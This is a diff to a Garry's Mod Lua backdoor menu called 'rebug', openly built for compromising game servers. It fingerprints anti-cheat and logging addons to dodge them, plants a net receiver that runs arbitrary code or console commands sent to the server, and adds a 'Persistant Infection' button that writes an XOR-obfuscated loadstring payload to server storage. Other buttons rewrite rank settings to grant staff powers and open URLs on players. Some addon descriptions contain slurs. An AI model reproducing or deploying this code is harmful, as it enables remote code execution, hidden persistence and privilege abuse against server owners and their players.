@@ -198,11 +198,11 @@ timer.Simple(2, function()
             return
         end
 
-	--[[if (_G.Loaded2) then
+	if (_G.Loaded2) then
 		msgR(4.3, "The Backdoor menu has already been loaded, Reloading will cause errors!")
 		surface.PlaySound("buttons/lightswitch2.wav")
 		return
-	end]]
+	end
         _G.Loaded2 = true
     end
 
@@ -336,7 +336,7 @@ ULX LuaCmd Blocker
 	end
 
 	debug.sethook(trace, "c")
-		
+
 --[[-------------------------------------------------------------------------------------
 Administration Addons
 ----------------------------------------------------------------------------------------]]
@@ -1026,7 +1026,7 @@ AntiCheat Detection
 ----------------------------------------------------------------------------------------]]
             local acfags = {
                 ["BetterSNTE Anti-Exploit"] = {
-                    desc = "This was created shortly after SNTE became noticed to the pubic, This addon makes snte even \n more useful but luckly for you are detour works on this addon (Don't scan backdoors)",
+                    desc = "This was created shortly after SNTE became noticed to the pubic, This addon makes snte even \nmore useful but luckly for you are detour works on this addon (Don't scan backdoors)",
                     scan = function()
                         if file.Exists("epstat.lua", "LUA") or file.Exists("autorun/!!bettersnte.lua", "LUA") then
                             return true
@@ -1036,7 +1036,7 @@ AntiCheat Detection
                     end
                 },
                 ["Cake Anti-Cheat (CAC)"] = {
-                    desc = "One of the best anticheats ever created on gmod still bans kids for cheating after it \n was removed from gmodstore in 2017. Pity it it was never made to detect backdoors.",
+                    desc = "One of the best anticheats ever created on gmod still bans kids for cheating after it \nwas removed from gmodstore in 2017. Pity it it was never made to detect backdoors.",
                     scan = function()
                         if _G.CAC then
                             return true
@@ -1046,7 +1046,7 @@ AntiCheat Detection
                     end
                 },
                 ["Quack Anti-Cheat (QAC)"] = {
-                    desc = "This addon is a joke even when it was released in 2014 it didn't detect anything. \n Still to this day i question if it was actually meant to ban people.",
+                    desc = "This addon is a joke even when it was released in 2014 it didn't detect anything. \nStill to this day i question if it was actually meant to ban people.",
                     scan = function()
                         if _G.QAC then
                             return true
@@ -1056,7 +1056,7 @@ AntiCheat Detection
                     end
                 },
                 ["Simplac Anti-Cheat (SAC)"] = {
-                    desc = "This anticheat became popular for less than a week then get detoured shortly after not only that this anticheat had an exploit to crash servers \n what a mess for simplac lol.",
+                    desc = "This anticheat became popular for less than a week then get detoured shortly after not only that this anticheat had an exploit to crash servers \nwhat a mess for simplac lol.",
                     scan = function()
                         if _G.simplicity then
                             return true
@@ -1066,7 +1066,7 @@ AntiCheat Detection
                     end
                 },
                 ["Cardinal Anti-Cheat"] = {
-                    desc = "This anticheat works like a screengrab and it's detections won't detect anything including something like kone bypass or some other shit 2014 dll bypass. I also \n like how this was made somewhere around 2018 but surely you can make something better than that.",
+                    desc = "This anticheat works like a screengrab and it's detections won't detect anything including something like kone bypass or some other shit 2014 dll bypass. I also \nlike how this was made somewhere around 2018 but surely you can make something better than that.",
                     scan = function()
                         if file.Exists("sh_cardinal.lua","LUA") or file.Exists("client/cl_cardinal.lua","LUA") then
                             return true
@@ -1076,7 +1076,7 @@ AntiCheat Detection
                     end
                 },
                 ["CIB Anti-Exploit"] = {
-                    desc = "This anticheat mainly bans people for putting certain words in console such as 'smeghack' or some old menu that has been out \n for ages however i don't think they have insert key in there keywords.",
+                    desc = "This anticheat mainly bans people for putting certain words in console such as 'smeghack' or some old menu that has been out \nfor ages however i don't think they have insert key in there keywords.",
                     scan = function()
                         if file.Exists("cib/sh_config_cib.lua","LUA") or file.Exists("autorun/sh_start_cib.lua","LUA") then
                             return true
@@ -1086,7 +1086,7 @@ AntiCheat Detection
                     end
                 },
                 ["Nyaaa Anti-Exploit"] = {
-                    desc = "From my understanding this addon was created to prevent people from backdooring and i can tell that this isn't popular and never will be \n i am fairly certain that this addon doesn't even detect anything.",
+                    desc = "From my understanding this addon was created to prevent people from backdooring and i can tell that this isn't popular and never will be \ni am fairly certain that this addon doesn't even detect anything.",
                     scan = function()
                         if file.Exists("autorun/ab.lua","LUA") or file.Exists("autorun/client/ab.lua","LUA") then
                             return true
@@ -1096,7 +1096,7 @@ AntiCheat Detection
                     end
                 },
 				["Jenni Anti-Exploit"] = {
-                    desc = "This is a worse version of SNTE, It would make 1 net string appear to those cheaters that have it in their list except rebug doesn't have 'anti_exploits_ban' \n in its list so no ban for you :)",
+                    desc = "This is a worse version of SNTE, It would make 1 net string appear to those cheaters that have it in their list except rebug doesn't have 'anti_exploits_ban' \nin its list so no ban for you :)",
                     scan = function()
                         if file.Exists("autorun/client/cl_anti_exploits.lua","LUA") then
                             return true
@@ -1106,7 +1106,7 @@ AntiCheat Detection
                     end
                 },
 				["Telecomm Anti-Exploit"] = {
-                    desc = "This is a copy of the addon 'betterSnte' it uses the same functionality as that addon, To me \n i find this pointless to use on a gmod server let alone rename the addon.(Don't scan backdoors)",
+                    desc = "This is a copy of the addon 'betterSnte' it uses the same functionality as that addon, To me \ni find this pointless to use on a gmod server let alone rename the addon.(Don't scan backdoors)",
                     scan = function()
                         if file.Exists("autorun/client/cl_antinexploits.lua","LUA") then
                             return true
@@ -1116,7 +1116,7 @@ AntiCheat Detection
                     end
                 },
                 ["SNTE Anti-Exploit"] = {
-                    desc = "This has been ruining skids for more than a year now. With our methods you can detour \n this idiotic anti-cheat and not have a problem with it.",
+                    desc = "This has been ruining skids for more than a year now. With our methods you can detour \nthis idiotic anti-cheat and not have a problem with it.",
                     scan = function()
                         if ConVarExists("snte_ulxluarun") or file.Exists("autorun/!!bettersnte.lua", "LUA") or file.Exists("autorun/!coresource_snte.lua", "LUA") or istable(global_nets) then -- if BetterSNTE then makes present
                             return true
@@ -1126,7 +1126,7 @@ AntiCheat Detection
                     end
                 },
                 ["Modern Anti-Cheat"] = {
-                    desc = "This addon took ideas from snte and has a dhtml detection methods such as modules, \n Luckly for you WE are undetected from this shit.",
+                    desc = "This addon took ideas from snte and has a dhtml detection methods such as modules, \nLuckly for you WE are undetected from this shit.",
                     scan = function()
                         if file.Exists("autorun/client/!!!!!!!!!!!!!!!!!!!!!!aaaaaaaaaaa.lua", "LUA") or file.Exists("autorun/client/cl_mac.lua", "LUA") then
                             return true
@@ -1136,7 +1136,7 @@ AntiCheat Detection
                     end
                 },
                 ["Swift Anti-Cheat"] = {
-                    desc = "This is the worst anticheat that i have ever seen i used kone bypass and it didn't ban me \n let alone use a backdoor what a joke of an addon.",
+                    desc = "This is the worst anticheat that i have ever seen i used kone bypass and it didn't ban me \nlet alone use a backdoor what a joke of an addon.",
                     scan = function()
                         if file.Exists("swiftac.lua", "LUA") then
                             return true
@@ -1146,7 +1146,7 @@ AntiCheat Detection
                     end
                 },
                 ["Umbrella Anti-Exploit"] = {
-                    desc = "This was created by a bunch of retarded russians, you would have thought that they would have a brain for cheating \n in games but for gmod however they make something that is a copy of snte.",
+                    desc = "This was created by a bunch of retarded russians, you would have thought that they would have a brain for cheating \nin games but for gmod however they make something that is a copy of snte.",
                     scan = function()
                         if file.Exists("umbrella.lua", "LUA") then
                             return true
@@ -1156,7 +1156,7 @@ AntiCheat Detection
                     end
                 },
                 ["Viper Anti-Exploit"] = {
-                    desc = "This is shit anticheat was uploaded to a leaking website by some russian, this addon is complete shit doesn't even detect anything \n don't bother get scared of this shit if you somehow find it on a server.",
+                    desc = "This is shit anticheat was uploaded to a leaking website by some russian, this addon is complete shit doesn't even detect anything \ndon't bother get scared of this shit if you somehow find it on a server.",
                     scan = function()
                         if file.Exists("cl_viperbdcheck.lua", "LUA") or file.Exists("sh_viperbdcheck.lua", "LUA") or file.Exists("autorun/cl_viper.lua", "LUA") then
                             return true
@@ -1166,7 +1166,7 @@ AntiCheat Detection
                     end
                 },
                 ["Raptor Anti-Exploit"] = {
-                    desc = "This is a russian anticheat that is completly useless. It doesn't have anything inside that code that even detect kone bypass.\n Do not be feared by this addon.",
+                    desc = "This is a russian anticheat that is completly useless. It doesn't have anything inside that code that even detect kone bypass.\nDo not be feared by this addon.",
                     scan = function()
                         if file.Exists("autorun/client/cl_rac.lua", "LUA") then
                             return true
@@ -1176,7 +1176,7 @@ AntiCheat Detection
                     end
                 },
                 ["C0nw0nk Anti-Cheat"] = {
-                    desc = "This isn't a popular anticheat it has low detection methods the only thing that can catch you is the bhop \n but ill be suprised if that actually works.",
+                    desc = "This isn't a popular anticheat it has low detection methods the only thing that can catch you is the bhop \nbut ill be suprised if that actually works.",
                     scan = function() 
                         if file.Exists("autorun/send-lua-and-net-send.lua", "LUA") then
                             return true
@@ -1186,7 +1186,7 @@ AntiCheat Detection
                     end
                 },
                 ["Prop Protection (SPC)"] = {
-                    desc = "GmodStore paid addon, This will prevent you from prop killing an`d prop climbing. \n This will irritate you if you were planing on prop killing",
+                    desc = "GmodStore paid addon, This will prevent you from prop killing an`d prop climbing. \nThis will irritate you if you were planing on prop killing",
                     scan = function()
                         if file.Exists("autorun/smartsauce_loader.lua", "LUA") or file.Exists("autorun/smartsauce/sv_main.lua", "LUA") then
                             return true
@@ -1196,7 +1196,7 @@ AntiCheat Detection
                     end
                 },
                 ["Spawn Protection (SZ)"] = {
-                    desc = "GmodStore paid spawn protection an addon that has been around for some time and is still \n a popular addon to lots of people including me",
+                    desc = "GmodStore paid spawn protection an addon that has been around for some time and is still \na popular addon to lots of people including me",
                     scan = function()
                         if file.Exists("sz_config.lua", "LUA") or file.Exists("autorun/autorun_safezones.lua", "LUA") then
                             return true
@@ -1206,7 +1206,7 @@ AntiCheat Detection
                     end
                 },
                 ["Screengrab Anti-Cheat"] = {
-                    desc = "This is an addon that has been catching skids out for a while, most wonder how admins see \n there shitty wall hacks except rebug doesn't have any",
+                    desc = "This is an addon that has been catching skids out for a while, most wonder how admins see \nthere shitty wall hacks except rebug doesn't have any",
                     scan = function()
                         if file.Exists("cl_screengrab.lua", "LUA") or file.Exists("autorun/sh_screengrab.lua", "LUA") or file.Exists("autorun/sh_screengrab_v2.lua", "LUA") then
                             return true
@@ -1216,7 +1216,7 @@ AntiCheat Detection
                     end
                 },
                 ["BLogs Logging System"] = {
-                    desc = "One of the best logging systems added to gmod since release, it has lots of logging features including \n live feed which has been useful for lots of servers( Be careful )",
+                    desc = "One of the best logging systems added to gmod since release, it has lots of logging features \nincluding live feed which has been useful for lots of servers( Be careful )",
                     scan = function()
                         if file.Exists("gmodadminsuite/modules/logging/cl_menu.lua", "LUA") or file.Exists("vgui/gas_logging_advanced_search_item.lua", "LUA") then
                             return true
@@ -1226,7 +1226,7 @@ AntiCheat Detection
                     end
                 },
                 ["MLogs Logging System"] = {
-                    desc = "Quite a decent logging system i have been told, This addon logs lots of things im not sure \n that it logs the same or more than blogs",
+                    desc = "Quite a decent logging system i have been told, This addon logs lots of things im not sure \nthat it logs the same or more than blogs",
                     scan = function()
                         if file.Exists("mlib/lua/autorun/mlib.lua", "LUA") or file.Exists("mlogs2/lua/mlogs/config/cl_config", "LUA") then
                             return true
@@ -1236,7 +1236,7 @@ AntiCheat Detection
                     end
                 },
                 ["PLogs Logging System"] = {
-                    desc = "Used to be a paid gmodstore addon BUT now is on github for lack of updates, This was a shit addon anyways \n doesn't surprise me that its on github now lol.",
+                    desc = "Used to be a paid gmodstore addon BUT now is on github for lack of updates, This was a shit addon anyways \ndoesn't surprise me that its on github now lol.",
                     scan = function()
                         if file.Exists("plogs_cfg.lua", "LUA") or file.Exists("plogs_mysql_cfg.lua", "LUA") or file.Exists("autorun/plogs_init.lua", "LUA") then
                             return true
@@ -1246,7 +1246,7 @@ AntiCheat Detection
                     end
                 },
                 ["LUA Stealer (Void)"] = {
-                    desc = "This is one of my creation, It is able to download the source code to your lua scripts from \n you just pressing a button. This is a good addon yesss :)",
+                    desc = "This is one of my creation, It is able to download the source code to your lua scripts from \nyou just pressing a button. This is a good addon yesss :)",
                     scan = function()
                         if file.Exists("autorun/sh_fuckthissheet.lua", "LUA") then
                             return true
@@ -1580,6 +1580,21 @@ Panels 2 : backdoors :)
             noob.PostLua([[util.AddNetworkString ('REBUG') net.Receive ('REBUG', function (length, ply) local netString = net.ReadString () local bit = net.ReadBit () if bit == 1 then RunString (netString) else game.ConsoleCommand (netString ..'\n') end end)]])
         end)
 
+        rebug.AddButton("@Persistant Infection", Bar1, function()
+            surface.PlaySound("buttons/button18.wav")
+            noob.PostLua([[if not file.Exists("xeon", "DATA") then
+				file.CreateDir("xeon")
+				end
+				if file.Exists("xeon", "DATA") then
+				file.Write("xeon/xeon.dat",[=[
+-- Copyright © 2018 William Venner
+-- Tampering will result in immediate automatic license revokation
+
+key="PASSWORD"local a=loadstring((function(b,c)function bxor(d,e)local f={{0,1},{1,0}}local g=1;local h=0;while d>0 or e>0 do h=h+f[d%2+1][e%2+1]*g;d=math.floor(d/2)e=math.floor(e/2)g=g*2 end;return h end;local i=function(b)local j={}local k=1;local l=b[k]while l>=0 do j[k]=b[l+1]k=k+1;l=b[k]end;return j end;local m=function(b,c)if#c<=0 then return{}end;local k=1;local n=1;for k=1,#b do b[k]=bxor(b[k],string.byte(c,n))n=n+1;if n>#c then n=1 end end;return b end;local o=function(b)local j=""for k=1,#b do j=j..string.char(b[k])end;return j end;return o(m(i(b),c))end)({287,238,149,337,258,223,348,233,250,276,244,148,259,338,124,299,362,143,277,353,319,164,194,229,327,364,232,247,227,196,295,142,313,207,127,322,261,186,208,360,255,139,202,270,312,302,363,241,333,181,321,151,130,141,288,222,266,274,166,239,264,135,349,152,219,218,162,212,157,263,294,314,204,357,190,291,184,355,197,365,156,275,169,356,315,245,343,269,256,144,213,138,189,354,220,230,304,140,251,311,310,301,246,331,334,136,282,187,221,307,193,267,174,328,326,133,292,225,297,330,-1,103,140,56,23,117,135,17,20,254,23,238,67,76,160,85,73,161,22,36,4,75,75,0,17,132,252,173,3,11,182,0,80,231,225,146,35,6,34,22,68,13,16,162,66,126,9,192,207,17,34,112,80,66,27,56,232,65,192,197,93,12,215,153,17,181,66,16,57,95,76,70,248,17,29,3,10,21,53,91,63,22,85,190,11,185,251,4,33,214,119,210,11,21,149,79,122,227,3,73,74,11,12,23,194,11,11,23,119,0,23,117,74,11,22,101,197,83,16,0,204,69,146,219,66,77,74,29,9,232,2,17,85,227,59,49,17,203,17,12,100,73,111,17,77,201,31,23,30,13,76,69,13,167,21,0,77,4,206,229,245,157,55,199,177,18,53,32,54,197,200,13,0,120,27,11,210,1,124,75,68,6,66,81,19,95,137,54,56,165,6,75,76,1,10,26,64,148,192,77,206,8,66,116,30,8,2,10,11,19,76,21,242,17,66,128,57,54,9,210,220,20,157,66,81,77,64,82,12,75,26,222,87,1,74,17,6,77,178,80,36,136,55,76,11,75,26,225,113},key))if a then a()else print("bruh")end]=])
+
+			end]])
+        end)
+
         rebug.AddButton("Artillery Server Strike", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
             noob.PostLua([[if !bombstrike then
@@ -1612,7 +1627,7 @@ Panels 2 : backdoors :)
 
         rebug.AddButton("AWarns2 user block", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-				noob.PostLua([[AWarn.groupBlacklist = {"user",}]])
+			noob.PostLua([[AWarn.groupBlacklist = {"user",}]])
 				rprint('Blocked awarns from warning users')
 		end)
 
@@ -1912,22 +1927,8 @@ Panels 2 : backdoors :)
 
         rebug.AddButton("Unboxing 2 Staff", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
-				noob.PostLua([[BUC2.RanksThatCanGiveItems = {"user"}
-				BUC2.DropRankList = {"user"}]])
-				rprint('Gives you access to !unboxadmin command')
-        end)
-
-        rebug.AddButton("Trash Man Bag = Rich", Bar1, function()
-            surface.PlaySound("buttons/button18.wav")
-				noob.PostLua([[ recycle_types = {
-				[1] = {
-					name = "Paper",
-					trash_per_block = 100, //kg
-					recycle_time = 10,
-					money = 999999999,
-					mat = "zerochain/props_trashman/recycleblock/ztm_recycledblock_paper_diff"
-				},\n
-			}]]) rprint('Sell a bag will make you rich')		
+			noob.PostLua([[BUC2.RanksThatCanGiveItems = {"user"} BUC2.DropRankList = {"user"}]])
+			rprint('Gives you access to !unboxadmin command')
         end)
 
         rebug.AddButton("Rave Music", Bar1, function()
@@ -1947,12 +1948,6 @@ Panels 2 : backdoors :)
 				moanstep = false
 				end]])
         end)
-
-        rebug.AddButton("Oil Rush Sell = Rich", Bar1, function()
-            surface.PlaySound("buttons/button18.wav")
-				noob.PostLua([[zrush.config.SellValue = 9999]])
-				rprint('Sell equipment will make you rich')
-		end)
 
         rebug.AddButton("Open URL On Players", Bar1, function()
             surface.PlaySound("buttons/button18.wav")
